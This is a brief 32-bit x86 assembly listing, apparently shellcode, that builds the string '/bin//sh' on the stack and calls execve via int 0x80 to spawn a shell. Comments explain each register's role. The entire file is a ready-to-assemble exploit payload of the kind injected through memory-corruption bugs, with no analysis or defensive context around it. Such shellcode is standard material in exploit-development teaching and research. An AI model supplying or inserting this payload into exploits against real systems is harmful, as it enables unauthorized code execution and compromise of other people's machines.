BITS 32
; execute execve with argument:
; ebx: "/bin//sh" (point to the name of the program to run)
; ecx: NULL (point to the arguments of the program)
; edx: undefined (point to the environment variables of the program)
xor ecx, ecx ; ecx = 0
mul ecx	; eax = 0
mov al, 0xb ; eax = 0xb

push ecx			; NULL
push 0x68732f2f		; "//sh"
push 0x6e69622f		; "/bin"

mov ebx, esp	; ptr to ["/bin//sh", NULL] string
int 0x80 